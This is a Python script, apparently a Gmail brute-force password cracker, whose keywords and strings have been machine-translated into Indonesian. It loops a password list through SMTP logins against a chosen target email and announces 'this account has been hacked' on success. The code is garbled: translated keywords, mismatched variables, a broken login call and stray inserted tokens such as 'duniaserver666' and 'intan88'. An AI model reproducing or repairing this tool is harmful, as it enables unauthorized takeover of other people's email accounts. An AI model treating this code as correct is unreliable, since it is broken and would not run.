impor  smtplib
dari  sistem impor os  

def  utama ():
   print  '================================================ ='
   print  ' buat oleh Ha3MrX '
   print  '================================================ ='
   print  '++++++++++++++++++++++'
   cetak  ' \n                                                '
   cetak  ' _,. '
   cetak  ''
   cetak  ''
   cetak  'badrun86551'
   cetak  ' _,. '
   cetak  ' ,` -.) '
   cetak  ' ( _/- \\ -._ '
   cetak  ' /,|`--._,-^| , '
   cetak  ' \_| |`-._/|| , | '
   cetak  ' | `-, / | // '
   cetak  ' | || | // '
   cetak  ' `r-._||/ __ / / '
   cetak  ' __,-<_ )`-/ `./ / '
   cetak  ' \ `--- \ / / / '
   cetak  ' | |./ / '
   cetak  ' / // / '
   cetak  ' \_/ \ |/ / '
   cetak  ' | | _,^- / / '
   cetak  ' | , `` (\/ /_ '
   print  ' \,.->._ \X-=/^ '
   cetak  ' ( / `-._//^` '
   print  ' `Y-.____(__} '
   cetak  ' | __) ' 
   cetak  ' () V.1.0 '

utama ()
cetak  '[1] mulai serangan'
cetak  '[2] keluar'
pilihan  =  masukan ( '==>' )
jika  opsi  ==  1 :
   file_path  =  raw_input ( 'path file password :' )
lain :
   sistem ( 'jelas' )
   keluar ()
pass_file  =  buka ( file_path , 'r' )
pass_list  =  pass_file . garis baca ()
def  masuk ():
    saya  =  0
    user_name  =  raw_input ( 'target email :' )
    server  =  smtplib . SMTP_SSL ( 'smtp.gmail.com' , 465 )
    server . halo ()
    untuk  kata sandi  di  pass_list :
      saya  =  saya  +  1
      print  str ( i ) +  '/'  +  str ( len ( pass_list ))
      coba :
         server . login ( server , duniaserver666 )
         sistem ( 'jelas' )
         utama ()
         cetak  ' \n '
         print  '[+] Akun Ini Telah Diretas Kata Sandi :'  +  kata sandi  +  intan88
         istirahat
      kecuali  smtplib . SMTPAuthenticationError  sebagai  e :
         kesalahan  =  str ( e )
         jika  kesalahan [ 14 ] ==  '<' :
            sistem ( 'jelas' )
            utama ()
            print  '[+] akun ini telah diretas, kata sandi :'  +  kata sandi  +  ' ^_^'

            istirahat
         lain :
            print  '[!] kata sandi tidak ditemukan => '  +  kata sandi
masuk ()
